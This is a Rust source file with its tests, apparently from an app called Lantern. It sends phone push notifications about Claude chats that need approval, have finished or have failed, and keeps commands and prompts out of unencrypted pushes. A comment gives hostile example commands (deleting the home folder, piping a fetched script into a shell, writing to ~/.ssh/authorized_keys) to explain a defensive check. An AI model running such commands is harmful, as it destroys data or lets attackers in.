//! Telling a paired phone that a chat needs it, or has finished, when it isn't looking: a push straight to Apple for a phone
//! that gave its own device token (the way the lock-screen cards go), or through Expo's service for one that gave an Expo token.
//! What goes out is a chat id and a kind, with words that name no code and no prompt (at most one word of what is asked, as
//! the lock-screen card says it); the chat's title only if the user turned that on in Settings. At most one push per chat and
//! kind, until the user has looked: opened the chat on the phone, answered what was asked, or sent the next message.
//!
//! With "Show what Claude asks in notifications" on, and a phone that made a push key, the push also carries the real words
//! (the whole command, the file and what changes) encrypted for the phone's notification extension (see rich.rs); the generic
//! ones above stay as the fallback, and a phone without a key, or with the setting off, gets only those.
//!
//! A push straight to Apple carries buttons (a notification category), which the phone and its watch show without opening the
//! app: Allow and Deny on a prompt for a command, an edit or a tool, and Reply on a chat that finished. A prompt of that kind is
//! its own push, with its request id, so a button answers that very prompt (the Mac refuses an id nothing is waiting on).

use super::bus::{BusEvent, EventBus};
use super::gateway::BoxFut;
use super::hub::{ChatStatus, SessionHub};
use super::live_activity::{Alert, Apns, Needs};
use super::pairing::{is_apns_token, Device, RemoteStore};
use super::push_log::note;
use super::rich;
use crate::ui_event::UiEvent;
use serde::Serialize;
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::broadcast;

/// Expo's push endpoint, and the most messages one request may hold.
pub const EXPO_URL: &str = "https://exp.host/--/api/v2/push/send";
const BATCH: usize = 100;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Kind {
    NeedsYou,
    Finished,
    Failed,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct PushData {
    pub slot: String,
    pub kind: Kind,
}

/// One notification, as Expo takes it.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct PushMessage {
    pub to: String,
    pub title: String,
    pub body: String,
    pub data: PushData,
    pub sound: &'static str,
}

/// What Expo said about one message.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Ticket {
    pub ok: bool,
    /// Expo's code for what went wrong ("DeviceNotRegistered": the phone no longer has the app).
    pub error: Option<String>,
}

pub trait PushSender: Send + Sync + 'static {
    fn send(&self, messages: Vec<PushMessage>) -> BoxFut<Result<Vec<Ticket>, String>>;
}

/// Expo's push service, over HTTPS.
pub struct ExpoPush {
    client: reqwest::Client,
}

impl ExpoPush {
    pub fn new() -> Result<Self, String> {
        // The updater installs this too, when it first checks; whichever comes first does.
        if rustls::crypto::CryptoProvider::get_default().is_none() {
            let _ = rustls::crypto::ring::default_provider().install_default();
        }
        reqwest::Client::builder().timeout(Duration::from_secs(15)).build().map(|client| Self { client }).map_err(|e| e.to_string())
    }
}

/// The tickets in Expo's answer, in the order of the messages sent.
pub fn tickets_from(answer: &serde_json::Value) -> Vec<Ticket> {
    answer["data"]
        .as_array()
        .map(|list| {
            list.iter()
                .map(|t| Ticket { ok: t["status"] == "ok", error: t["details"]["error"].as_str().map(str::to_string) })
                .collect()
        })
        .unwrap_or_default()
}

impl PushSender for ExpoPush {
    fn send(&self, messages: Vec<PushMessage>) -> BoxFut<Result<Vec<Ticket>, String>> {
        let client = self.client.clone();
        Box::pin(async move {
            let mut all = Vec::new();
            for batch in messages.chunks(BATCH) {
                let response = client.post(EXPO_URL).header("Accept", "application/json").json(&batch).send().await.map_err(|e| e.to_string())?;
                if !response.status().is_success() {
                    return Err(format!("Expo's push service answered {}", response.status()));
                }
                let answer: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
                all.extend(tickets_from(&answer));
            }
            Ok(all)
        })
    }
}

/// Which chats a phone is looking at right now (the gateway knows).
pub type Watched = Arc<dyn Fn(&str) -> bool + Send + Sync>;

pub struct Notifier {
    store: Arc<RemoteStore>,
    hub: Arc<SessionHub>,
    sender: Arc<dyn PushSender>,
    apns: Arc<dyn Apns>,
    watched: Watched,
    /// What was pushed and hasn't been looked at since: one entry per chat and kind, and per prompt for the ones a button answers.
    sent: Mutex<HashSet<(String, Kind, Option<String>)>>,
}

/// What a prompt that needs the user asks for, and its id.
#[derive(Debug, Clone)]
struct Ask {
    request_id: Option<String>,
    needs: Needs,
    /// The one name that says which: the program of a command, the file's name, the tool's. Only used when the user turned
    /// "Show titles" on (see `detail_of`).
    detail: Option<String>,
    /// What the prompt asks, in words for the phone's extension, and whether they are all of it (see rich.rs); only sent when the
    /// setting is on.
    text: Option<rich::Prompt>,
}

impl Ask {
    /// Whether the notification has Allow and Deny: a command, an edit or a tool. A question needs a choice, and a merge or a
    /// plan an approval that is read first: those are answered in the app.
    fn answerable(&self) -> bool {
        self.request_id.is_some() && matches!(self.needs, Needs::Command | Needs::Edit | Needs::Tool)
    }
}

/// The buttons a notification has, by the category the phone registered (see mobile/src/notificationActions.ts).
const CATEGORY_DECIDE: &str = "lantern_decide";
const CATEGORY_REPLY: &str = "lantern_reply";

/// The words of a push, by kind: with no title (the default), and with the chat's.
fn words(kind: Kind, title: Option<&str>) -> (String, String) {
    match (kind, title) {
        (Kind::NeedsYou, None) => ("Lantern".into(), "A chat needs you.".into()),
        (Kind::Finished, None) => ("Lantern".into(), "A chat finished.".into()),
        (Kind::Failed, None) => ("Lantern".into(), "A chat stopped with an error.".into()),
        (Kind::NeedsYou, Some(t)) => (t.into(), "Needs you.".into()),
        (Kind::Finished, Some(t)) => (t.into(), "Finished.".into()),
        (Kind::Failed, Some(t)) => (t.into(), "Stopped with an error.".into()),
    }
}

impl Notifier {
    pub fn new(store: Arc<RemoteStore>, hub: Arc<SessionHub>, sender: Arc<dyn PushSender>, apns: Arc<dyn Apns>, watched: Watched) -> Arc<Self> {
        Arc::new(Self { store, hub, sender, apns, watched, sent: Mutex::default() })
    }

    /// Follows the bus until it closes (the task `start_remote` runs and `stop` aborts).
    pub async fn run(self: Arc<Self>, bus: Arc<EventBus>) {
        let mut events = bus.subscribe();
        loop {
            match events.recv().await {
                Ok(ev) => self.handle(&ev).await,
                // Behind: what was missed may have been a push, but the phone's own list shows what waits.
                Err(broadcast::error::RecvError::Lagged(_)) => continue,
                Err(broadcast::error::RecvError::Closed) => return,
            }
        }
    }

    /// A phone is looking at the chat: what was pushed about it has been seen.
    pub fn opened(&self, slot: &str) {
        self.sent.lock().unwrap().retain(|(s, _, _)| s != slot);
    }

    fn forget(&self, slot: &str, kinds: &[Kind]) {
        self.sent.lock().unwrap().retain(|(s, k, _)| s != slot || !kinds.contains(k));
    }

    /// What one event does: a push, or the end of a reason not to push again.
    pub async fn handle(&self, ev: &BusEvent) {
        let slot = ev.slot.as_str();
        match &ev.event {
            UiEvent::PermissionRequested { request_id, tool_name, input } => {
                let needs = Needs::of_tool(tool_name);
                let folder = self.hub.chat(slot).and_then(|c| c.folder);
                let text = rich::prompt_text(needs, tool_name, input, folder.as_deref());
                self.push(slot, Kind::NeedsYou, Some(Ask { request_id: Some(request_id.clone()), needs, detail: detail_of(needs, tool_name, input), text })).await
            }
            UiEvent::MergeProposed { .. } => self.push(slot, Kind::NeedsYou, Some(Ask { request_id: None, needs: Needs::Approval, detail: None, text: None })).await,
            // Nothing waits any more (answered anywhere, or withdrawn): the next thing that waits is news again.
            UiEvent::PermissionResolved { .. } | UiEvent::PermissionWithdrawn { .. } | UiEvent::MergeResolved { .. } => {
                if self.hub.chat(slot).is_none_or(|c| c.status != ChatStatus::NeedsYou) {
                    self.forget(slot, &[Kind::NeedsYou]);
                }
            }
            UiEvent::TurnDone { is_error: false, .. } => self.push(slot, Kind::Finished, None).await,
            UiEvent::TurnDone { is_error: true, .. } => self.push(slot, Kind::Failed, None).await,
            UiEvent::SessionEnded { code: Some(c), .. } if *c != 0 => self.push(slot, Kind::Failed, None).await,
            // A new message starts a new turn, and a new claude starts over.
            UiEvent::UserText { .. } => self.forget(slot, &[Kind::Finished, Kind::Failed]),
            UiEvent::SessionStarted { .. } => self.forget(slot, &[Kind::Failed]),
            _ => {}
        }
    }

    async fn push(&self, slot: &str, kind: Kind, ask: Option<Ask>) {
        let saved = self.store.saved();
        // Remote control off, nobody to tell, or a phone is looking at this very chat.
        if !saved.enabled || (self.watched)(slot) {
            note(&format!("{} not pushed: {}", kind_name(kind), if saved.enabled { "a phone is looking at the chat" } else { "Remote control is off" }));
            return;
        }
        let devices: Vec<&Device> = saved.devices.iter().filter(|d| d.push_token.is_some()).collect();
        // A prompt a button answers is its own news; the rest is one push per chat and kind.
        let answerable = ask.as_ref().filter(|a| a.answerable());
        let key = (slot.to_string(), kind, answerable.and_then(|a| a.request_id.clone()));
        if devices.is_empty() {
            note(&format!("{} not pushed: no phone has a push token", kind_name(kind)));
            return;
        }
        if !self.sent.lock().unwrap().insert(key) {
            note(&format!("{} not pushed: already pushed and not looked at since", kind_name(kind)));
            return;
        }
        let title = saved.show_titles.then(|| self.hub.chat(slot).and_then(|c| c.title)).flatten().map(|t| t.chars().take(60).collect::<String>());
        let (apple, expo): (Vec<&Device>, Vec<&Device>) = devices.into_iter().partition(|d| d.push_token.as_deref().is_some_and(is_apns_token));
        let mut failed = false;
        if !expo.is_empty() {
            let (title, body) = words(kind, title.as_deref());
            let messages: Vec<PushMessage> = expo
                .iter()
                .map(|d| PushMessage { to: d.push_token.clone().unwrap_or_default(), title: title.clone(), body: body.clone(), data: PushData { slot: slot.to_string(), kind }, sound: "default" })
                .collect();
            match self.sender.send(messages).await {
                Ok(tickets) => {
                    note(&format!("{} to Expo: sent", kind_name(kind)));
                    // A phone that no longer has the app is forgotten for push (it stays paired).
                    for (device, ticket) in expo.iter().zip(tickets) {
                        if ticket.error.as_deref() == Some("DeviceNotRegistered") {
                            let _ = self.store.clear_push_token(&device.id);
                        }
                    }
                }
                Err(_) => {
                    note(&format!("{} to Expo: not sent", kind_name(kind)));
                    failed = true;
                }
            }
        }
        if !apple.is_empty() {
            // The project's name is on the lock-screen card whatever the setting, so it is in the notification too.
            let project = self.hub.chat(slot).and_then(|c| c.folder).and_then(|f| std::path::Path::new(&f).file_name().map(|n| n.to_string_lossy().into_owned()));
            // Which tool, program or file: only with "Show titles" on, as the chat's own title is.
            let detail = if saved.show_titles { ask.as_ref().and_then(|a| a.detail.as_deref()) } else { None };
            let alert = alert_for(slot, kind, ask.as_ref(), title.as_deref(), project.as_deref(), detail);
            // With the setting on, a phone that has a push key also gets the real words, sealed for its extension to read; the
            // generic ones go with them, for a phone that can't read them.
            let chat_title = self.hub.chat(slot).and_then(|c| c.title).map(|t| t.chars().take(60).collect::<String>());
            let sealed = |device: &Device| -> Option<Alert> {
                if !saved.rich_notifications {
                    return None;
                }
                let ask = ask.as_ref()?;
                let lead = project.as_deref().or(chat_title.as_deref()).unwrap_or("Lantern");
                let subtitle = if project.is_some() { chat_title.as_deref() } else { None };
                rich::sealed_alert(&alert, device.push_key.as_deref()?, slot, lead, subtitle, ask.text.as_ref()?)
            };
            for device in apple {
                let rich_alert = sealed(device);
                match self.apns.alert(device.push_token.as_deref().unwrap_or_default(), rich_alert.as_ref().unwrap_or(&alert)).await {
                    // A phone Apple no longer knows (the app was removed) is forgotten for push (it stays paired).
                    Ok(reply) if reply.gone() => {
                        let _ = self.store.clear_push_token(&device.id);
                    }
                    Ok(_) => {}
                    Err(_) => failed = true,
                }
            }
        }
        // Not sent (no network): it may be tried again by the next event of this kind.
        if failed {
            self.forget(slot, &[kind]);
        }
    }
}

fn kind_name(kind: Kind) -> &'static str {
    match kind {
        Kind::NeedsYou => "needs-you",
        Kind::Finished => "finished",
        Kind::Failed => "failed",
    }
}

/// The words of a notification straight to Apple: what a prompt asks for in a few words (never the command, the file or the
/// question). The project's name leads when it is known, with the chat's title under it only if the user turned that on;
/// without a project the title (if on) leads, else it is just "Lantern". Returns the title line, a subtitle and the body.
fn apple_words(kind: Kind, needs: Option<Needs>, title: Option<&str>, project: Option<&str>, detail: Option<&str>) -> (String, Option<String>, String) {
    let (plain, with_title) = match (kind, needs) {
        (Kind::NeedsYou, Some(Needs::Command)) => ("A chat wants to run a command.", "Wants to run a command."),
        (Kind::NeedsYou, Some(Needs::Edit)) => ("A chat wants to change a file.", "Wants to change a file."),
        (Kind::NeedsYou, Some(Needs::Tool)) => ("A chat wants to use a tool.", "Wants to use a tool."),
        (Kind::NeedsYou, Some(Needs::Question)) => ("A chat has a question.", "Has a question."),
        (Kind::NeedsYou, _) => ("A chat needs you.", "Needs you."),
        (Kind::Finished, _) => ("A chat finished.", "Finished."),
        (Kind::Failed, _) => ("A chat stopped with an error.", "Stopped with an error."),
    };
    // Which tool, program or file, in place of the general words.
    let named = match (kind, needs, detail) {
        (Kind::NeedsYou, Some(Needs::Command), Some(d)) => Some(format!("Wants to run {d}.")),
        (Kind::NeedsYou, Some(Needs::Edit), Some(d)) => Some(format!("Wants to change {d}.")),
        (Kind::NeedsYou, Some(Needs::Tool), Some(d)) => Some(format!("Wants to use {d}.")),
        _ => None,
    };
    let short = named.clone().unwrap_or_else(|| with_title.to_string());
    match (project, title) {
        (Some(p), t) => (p.into(), t.map(Into::into), short),
        (None, Some(t)) => (t.into(), None, short),
        (None, None) => ("Lantern".into(), None, named.unwrap_or_else(|| plain.to_string())),
    }
}

/// The one name that says which tool, program or file a prompt is about, short and plain: a command's program (not its
/// arguments, which may hold a password or a token), a file's name (not its folders or its contents), a tool's name. None when
/// there is no such name, or it isn't plain.
///
/// A command is named only when it is ONE simple command. Anything that chains, pipes, substitutes, redirects or backgrounds
/// (`ls && rm -rf ~`, `echo $(curl x | sh)`, `echo x > ~/.ssh/authorized_keys`) would be labelled by its harmless first word next
/// to an Allow button, so it gets no name and the notification says only that a chat wants to run a command. A `sudo` or `env`
/// in front gets none either: its flags and values would be taken for the program.
fn detail_of(needs: Needs, tool_name: &str, input: &serde_json::Value) -> Option<String> {
    let plain = |s: &str, max: usize| -> Option<String> {
        let s = s.trim();
        (!s.is_empty() && s.chars().count() <= max && s.chars().all(|c| c.is_alphanumeric() || " ._+-:".contains(c))).then(|| s.to_string())
    };
    match needs {
        Needs::Command => {
            let command = input["command"].as_str()?;
            if command.chars().any(|c| ";&|\n\r`$(){}<>\\".contains(c)) {
                return None;
            }
            let assignment = |w: &str| w.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_alphanumeric() || c == '_'));
            let word = command.split_whitespace().find(|w| !assignment(w))?;
            let wrappers = ["sudo", "env", "time", "nohup", "command", "exec", "nice", "xargs", "watch", "timeout", "stdbuf", "caffeinate"];
            let program = word.rsplit('/').next()?;
            if wrappers.contains(&program) {
                return None;
            }
            plain(program, 32)
        }
        Needs::Edit => {
            let path = input["file_path"].as_str().or_else(|| input["notebook_path"].as_str())?;
            plain(std::path::Path::new(path).file_name()?.to_str()?, 48)
        }
        Needs::Tool => match tool_name.strip_prefix("mcp__") {
            Some(rest) => {
                let (server, tool) = rest.split_once("__")?;
                plain(&format!("{server}: {}", tool.replace('_', " ")), 48)
            }
            None => plain(tool_name, 32),
        },
        _ => None,
    }
}

/// The notification for one chat and kind. The app reads `body` (the way Expo's service wraps its data): the chat, the kind, and
/// the prompt's id when a button answers it.
fn alert_for(slot: &str, kind: Kind, ask: Option<&Ask>, title: Option<&str>, project: Option<&str>, detail: Option<&str>) -> Alert {
    let (title, subtitle, body) = apple_words(kind, ask.map(|a| a.needs), title, project, detail);
    let answerable = ask.filter(|a| a.answerable());
    let category = match (kind, answerable) {
        (Kind::NeedsYou, Some(_)) => Some(CATEGORY_DECIDE),
        (Kind::Finished, _) => Some(CATEGORY_REPLY),
        _ => None,
    };
    let mut alert = serde_json::json!({"title": title, "body": body});
    if let Some(subtitle) = subtitle {
        alert["subtitle"] = subtitle.into();
    }
    let mut aps = serde_json::json!({"alert": alert, "sound": "default", "thread-id": slot});
    if let Some(category) = category {
        aps["category"] = category.into();
    }
    let mut data = serde_json::json!({"slot": slot, "kind": kind});
    if let Some(id) = answerable.and_then(|a| a.request_id.as_ref()) {
        data["request_id"] = id.clone().into();
    }
    Alert { body: serde_json::json!({"aps": aps, "body": data}) }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use serde_json::Value;

    /// A sender that keeps what it was given, and answers each message from `answer`.
    #[derive(Default)]
    pub struct Outbox {
        pub sent: Mutex<Vec<PushMessage>>,
        pub fail: Mutex<bool>,
        pub unregistered: Mutex<HashSet<String>>,
    }

    impl PushSender for Outbox {
        fn send(&self, messages: Vec<PushMessage>) -> BoxFut<Result<Vec<Ticket>, String>> {
            if *self.fail.lock().unwrap() {
                return Box::pin(async { Err("no network".to_string()) });
            }
            let tickets = messages.iter().map(|m| if self.unregistered.lock().unwrap().contains(&m.to) { Ticket { ok: false, error: Some("DeviceNotRegistered".into()) } } else { Ticket { ok: true, error: None } }).collect();
            self.sent.lock().unwrap().extend(messages);
            Box::pin(async move { Ok(tickets) })
        }
    }

    /// The notifications that went straight to Apple: the token and the whole body, and how Apple answers (200 unless told).
    #[derive(Default)]
    pub struct Alerts {
        pub sent: Mutex<Vec<(String, Value)>>,
        pub answer: Mutex<Option<Result<super::super::live_activity::Reply, String>>>,
    }

    impl Apns for Alerts {
        fn send(&self, _token: &str, _push: &super::super::live_activity::Push) -> BoxFut<Result<super::super::live_activity::Reply, String>> {
            Box::pin(async { Err("not a card".to_string()) })
        }

        fn alert(&self, token: &str, alert: &Alert) -> BoxFut<Result<super::super::live_activity::Reply, String>> {
            self.sent.lock().unwrap().push((token.to_string(), alert.body.clone()));
            let answer = self.answer.lock().unwrap().clone().unwrap_or(Ok(super::super::live_activity::Reply { status: 200, reason: None }));
            Box::pin(async move { answer })
        }
    }

    struct Rig {
        notifier: Arc<Notifier>,
        outbox: Arc<Outbox>,
        apple: Arc<Alerts>,
        store: Arc<RemoteStore>,
        hub: Arc<SessionHub>,
        watching: Arc<Mutex<HashSet<String>>>,
        seq: Mutex<u64>,
    }

    /// Phones with an Expo token.
    fn rig(devices: usize) -> Rig {
        rig_with(devices, false)
    }

    /// Phones with Apple's own device token (hex), which the Mac pushes to directly.
    fn rig_apple(devices: usize) -> Rig {
        rig_with(devices, true)
    }

    fn rig_with(devices: usize, apple: bool) -> Rig {
        let remote = crate::remote::Remote::default();
        remote.store.set_enabled(true).unwrap();
        for i in 0..devices {
            let d = remote.store.add_device(&[i as u8 + 1; 32], &format!("Phone {i}"), 1).unwrap();
            let token = if apple { format!("{:064x}", i + 1) } else { format!("ExponentPushToken[t{i}]") };
            remote.store.set_push_token(&d.id, &token).unwrap();
        }
        let outbox = Arc::new(Outbox::default());
        let alerts = Arc::new(Alerts::default());
        let watching: Arc<Mutex<HashSet<String>>> = Arc::default();
        let w = watching.clone();
        let notifier = Notifier::new(remote.store.clone(), remote.hub.clone(), outbox.clone(), alerts.clone(), Arc::new(move |slot| w.lock().unwrap().contains(slot)));
        Rig { notifier, outbox, apple: alerts, store: remote.store.clone(), hub: remote.hub.clone(), watching, seq: Mutex::new(0) }
    }

    impl Rig {
        /// An event of a chat, through the hub (as the bus does) and then the notifier.
        async fn event(&self, slot: &str, event: UiEvent) {
            let seq = {
                let mut s = self.seq.lock().unwrap();
                *s += 1;
                *s
            };
            let ev = BusEvent { slot: slot.into(), seq, event };
            self.hub.record(&ev);
            self.notifier.handle(&ev).await;
        }
        fn pushed(&self) -> Vec<PushMessage> {
            self.outbox.sent.lock().unwrap().clone()
        }
        fn alerts(&self) -> Vec<(String, Value)> {
            self.apple.sent.lock().unwrap().clone()
        }
    }

    fn ask(id: &str) -> UiEvent {
        UiEvent::PermissionRequested { request_id: id.into(), tool_name: "Bash".into(), input: serde_json::json!({"command": "echo SECRET-COMMAND"}) }
    }

    fn question(id: &str) -> UiEvent {
        UiEvent::PermissionRequested { request_id: id.into(), tool_name: "AskUserQuestion".into(), input: serde_json::json!({"questions": [{"question": "SECRET-QUESTION?"}]}) }
    }

    fn done(is_error: bool) -> UiEvent {
        UiEvent::TurnDone { is_error, result: Some("SECRET-RESULT".into()), cost_usd: None, tokens: None, session_cost_usd: None, session_tokens: 0, duration_ms: None, auth_hint: false, denied: 0, context_window: None }
    }

    #[tokio::test]
    async fn a_chat_that_needs_you_is_pushed_with_words_that_name_nothing() {
        let r = rig(2);
        r.hub.opened("a", "/p");
        r.event("a", UiEvent::UserText { text: "SECRET-PROMPT".into(), at: None, sent_by: None, images: 0 }).await;
        r.event("a", ask("p1")).await;
        let sent = r.pushed();
        assert_eq!(sent.len(), 2, "one for each phone with a token");
        assert_eq!((sent[0].title.as_str(), sent[0].body.as_str()), ("Lantern", "A chat needs you."));
        assert_eq!(sent[0].data, PushData { slot: "a".into(), kind: Kind::NeedsYou });
        let json = serde_json::to_string(&sent).unwrap();
        for secret in ["SECRET-COMMAND", "SECRET-PROMPT", "SECRET-RESULT", "Bash", "echo"] {
            assert!(!json.contains(secret), "{secret} leaked into a push");
        }
    }

    #[tokio::test]
    async fn a_removed_phone_hears_nothing_more_and_the_others_still_do() {
        let r = rig(2);
        let gone = r.store.saved().devices[0].clone();
        r.store.remove_device(&gone.id).unwrap();
        r.event("a", ask("p1")).await;
        let sent = r.pushed();
        assert_eq!(sent.len(), 1);
        assert_ne!(sent[0].to, gone.push_token.unwrap_or_default());
    }

    #[tokio::test]
    async fn only_one_push_per_chat_and_kind_until_it_has_been_looked_at() {
        let r = rig(1);
        r.event("a", question("q1")).await;
        r.event("a", question("q2")).await;
        assert_eq!(r.pushed().len(), 1);
        // Both answered: the next thing that waits is news again.
        r.event("a", UiEvent::PermissionResolved { request_id: "q1".into(), allow: true, by: "desktop".into() }).await;
        r.event("a", question("q3")).await;
        assert_eq!(r.pushed().len(), 1, "q2 is still waiting, so q3 isn't news");
        r.event("a", UiEvent::PermissionResolved { request_id: "q2".into(), allow: true, by: "desktop".into() }).await;
        r.event("a", UiEvent::PermissionResolved { request_id: "q3".into(), allow: true, by: "desktop".into() }).await;
        r.event("a", question("q4")).await;
        assert_eq!(r.pushed().len(), 2);
    }

    #[tokio::test]
    async fn each_prompt_a_button_answers_is_its_own_push_but_the_same_prompt_is_not_pushed_twice() {
        let r = rig_apple(1);
        r.event("a", ask("p1")).await;
        r.event("a", ask("p1")).await;
        r.event("a", ask("p2")).await;
        let ids: Vec<_> = r.alerts().iter().map(|(_, b)| b["body"]["request_id"].as_str().unwrap().to_string()).collect();
        assert_eq!(ids, vec!["p1", "p2"]);
    }

    #[tokio::test]
    async fn opening_the_chat_on_the_phone_makes_the_next_one_news() {
        let r = rig(1);
        r.event("a", done(false)).await;
        r.event("a", done(false)).await;
        assert_eq!(r.pushed().len(), 1);
        r.notifier.opened("a");
        r.event("a", done(false)).await;
        assert_eq!(r.pushed().len(), 2);
    }

    #[tokio::test]
    async fn a_finished_turn_is_news_again_after_the_next_message() {
        let r = rig(1);
        r.event("a", done(false)).await;
        r.event("a", UiEvent::UserText { text: "next".into(), at: None, sent_by: None, images: 0 }).await;
        r.event("a", done(false)).await;
        assert_eq!(r.pushed().iter().map(|m| m.body.as_str()).collect::<Vec<_>>(), vec!["A chat finished.", "A chat finished."]);
    }

    #[tokio::test]
    async fn an_error_or_a_crash_says_the_chat_stopped_with_one() {
        let r = rig(1);
        r.event("a", done(true)).await;
        r.event("b", UiEvent::SessionEnded { code: Some(1), stderr_tail: "SECRET-STDERR".into() }).await;
        r.event("c", UiEvent::SessionEnded { code: Some(0), stderr_tail: String::new() }).await;
        r.event("d", UiEvent::SessionEnded { code: None, stderr_tail: String::new() }).await;
        let sent = r.pushed();
        assert_eq!(sent.iter().map(|m| (m.data.slot.as_str(), m.body.as_str())).collect::<Vec<_>>(), vec![("a", "A chat stopped with an error."), ("b", "A chat stopped with an error.")]);
        assert!(!serde_json::to_string(&sent).unwrap().contains("SECRET-STDERR"));
    }

    #[tokio::test]
    async fn nothing_is_pushed_for_a_chat_a_phone_is_looking_at() {
        let r = rig(1);
        r.watching.lock().unwrap().insert("a".into());
        r.event("a", ask("p1")).await;
        r.event("a", done(false)).await;
        assert!(r.pushed().is_empty());
        r.event("b", done(false)).await;
        assert_eq!(r.pushed().len(), 1);
    }

    #[tokio::test]
    async fn nothing_is_pushed_when_remote_control_is_off_or_no_phone_has_a_token() {
        let off = rig(1);
        off.store.set_enabled(false).unwrap();
        off.event("a", ask("p1")).await;
        assert!(off.pushed().is_empty());
        let nobody = rig(0);
        nobody.event("a", ask("p1")).await;
        assert!(nobody.pushed().is_empty());
        // And a phone that registers later is told of what comes after, not what was missed before.
        let d = nobody.store.add_device(&[9; 32], "Late", 2).unwrap();
        nobody.store.set_push_token(&d.id, "ExponentPushToken[late]").unwrap();
        nobody.event("a", ask("p2")).await;
        assert_eq!(nobody.pushed().len(), 1);
    }

    #[tokio::test]
    async fn the_chat_title_is_in_a_push_only_when_the_user_turned_that_on() {
        let r = rig(1);
        r.hub.opened("a", "/p");
        r.hub.titled("a", "Release 0.1.53");
        r.store.set_show_titles(true).unwrap();
        r.event("a", ask("p1")).await;
        let sent = r.pushed();
        assert_eq!((sent[0].title.as_str(), sent[0].body.as_str()), ("Release 0.1.53", "Needs you."));
        let json = serde_json::to_string(&sent).unwrap();
        assert!(!json.contains("SECRET-COMMAND"));
    }

    #[tokio::test]
    async fn a_phone_that_no_longer_has_the_app_is_forgotten_for_push_but_stays_paired() {
        let r = rig(2);
        r.outbox.unregistered.lock().unwrap().insert("ExponentPushToken[t1]".into());
        r.event("a", ask("p1")).await;
        let saved = r.store.saved();
        assert_eq!(saved.devices.len(), 2);
        assert!(saved.devices[0].push_token.is_some());
        assert!(saved.devices[1].push_token.is_none());
    }

    #[tokio::test]
    async fn when_expo_can_not_be_reached_the_next_event_of_that_kind_tries_again() {
        let r = rig(1);
        *r.outbox.fail.lock().unwrap() = true;
        r.event("a", done(false)).await;
        assert!(r.pushed().is_empty());
        *r.outbox.fail.lock().unwrap() = false;
        r.event("a", done(false)).await;
        assert_eq!(r.pushed().len(), 1);
    }

    #[tokio::test]
    async fn merge_proposals_need_you_too() {
        let r = rig(1);
        r.event("a", UiEvent::MergeProposed { worker: "w".into(), name: "Builder".into(), branch: "b".into(), into: "main".into(), summary: "s".into(), commits: 1, files: vec![], uncommitted: 0, loose: vec![] }).await;
        assert_eq!(r.pushed()[0].body, "A chat needs you.");
        assert!(!serde_json::to_string(&r.pushed()).unwrap().contains("Builder"));
    }

    #[test]
    fn expos_answer_is_read_into_one_ticket_per_message() {
        let answer = serde_json::json!({"data": [{"status": "ok", "id": "x"}, {"status": "error", "message": "not registered", "details": {"error": "DeviceNotRegistered"}}, {"status": "error"}]});
        assert_eq!(tickets_from(&answer), vec![Ticket { ok: true, error: None }, Ticket { ok: false, error: Some("DeviceNotRegistered".into()) }, Ticket { ok: false, error: None }]);
        assert!(tickets_from(&serde_json::json!({"errors": []})).is_empty());
    }

    #[tokio::test]
    async fn a_prompt_for_a_command_goes_straight_to_apple_with_allow_and_deny_and_names_nothing() {
        let r = rig_apple(1);
        r.hub.opened("a", "/p");
        r.event("a", UiEvent::UserText { text: "SECRET-PROMPT".into(), at: None, sent_by: None, images: 0 }).await;
        r.event("a", ask("p1")).await;
        assert!(r.pushed().is_empty(), "not through Expo");
        let sent = r.alerts();
        assert_eq!(sent.len(), 1);
        assert_eq!(sent[0].0, format!("{:064x}", 1));
        assert_eq!(
            sent[0].1,
            serde_json::json!({
                "aps": {"alert": {"title": "p", "body": "Wants to run a command."}, "sound": "default", "thread-id": "a", "category": "lantern_decide"},
                "body": {"slot": "a", "kind": "needs_you", "request_id": "p1"},
            })
        );
        let json = serde_json::to_string(&sent).unwrap();
        for secret in ["SECRET-COMMAND", "SECRET-PROMPT", "SECRET-RESULT", "Bash", "echo"] {
            assert!(!json.contains(secret), "{secret} leaked into a push");
        }
    }

    /// A key the phone made, given to every phone of the rig.
    const KEY: &str = "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8=";

    fn give_keys(r: &Rig) {
        for d in r.store.saved().devices {
            r.store.set_push_key(&d.id, KEY).unwrap();
        }
    }

    fn words_of(alert: &Value) -> Value {
        let enc = alert["body"]["enc"].as_str().expect("sealed");
        let request_id = alert["body"]["request_id"].as_str().unwrap_or("");
        serde_json::from_slice(&rich::open(KEY, alert["body"]["slot"].as_str().unwrap(), request_id, enc).expect("opens")).unwrap()
    }

    #[tokio::test]
    async fn with_the_setting_on_a_phone_with_a_key_gets_the_real_words_sealed_beside_the_generic_ones() {
        let r = rig_apple(1);
        give_keys(&r);
        r.store.set_rich_notifications(true).unwrap();
        r.hub.opened("a", "/p");
        r.event("a", ask("p1")).await;
        let sent = r.alerts();
        assert_eq!(sent.len(), 1);
        let push = &sent[0].1;
        // The generic words and the buttons are as they were, and the push is marked for the extension.
        assert_eq!(push["aps"]["alert"], serde_json::json!({"title": "p", "body": "Wants to run a command."}));
        assert_eq!(push["aps"]["category"], "lantern_decide");
        assert_eq!(push["aps"]["mutable-content"], 1);
        assert_eq!(push["body"]["request_id"], "p1");
        // The real words are in it, and only sealed: Apple's copy has the command nowhere in the clear.
        assert!(!push.to_string().contains("SECRET-COMMAND"));
        assert_eq!(words_of(push), serde_json::json!({"title": "p", "body": "Wants to run:\necho SECRET-COMMAND"}));
    }

    #[tokio::test]
    async fn a_command_that_was_cut_or_an_edit_that_was_not_all_shown_has_no_buttons_and_a_whole_one_keeps_them() {
        let r = rig_apple(1);
        give_keys(&r);
        r.store.set_rich_notifications(true).unwrap();
        r.hub.opened("a", "/p");
        let bash = |id: &str, command: String| UiEvent::PermissionRequested { request_id: id.into(), tool_name: "Bash".into(), input: serde_json::json!({"command": command}) };
        let edit = |id: &str, new: &str| UiEvent::PermissionRequested { request_id: id.into(), tool_name: "Edit".into(), input: serde_json::json!({"file_path": "/p/a.rs", "old_string": "a", "new_string": new}) };
        r.event("a", bash("short", "git status".into())).await;
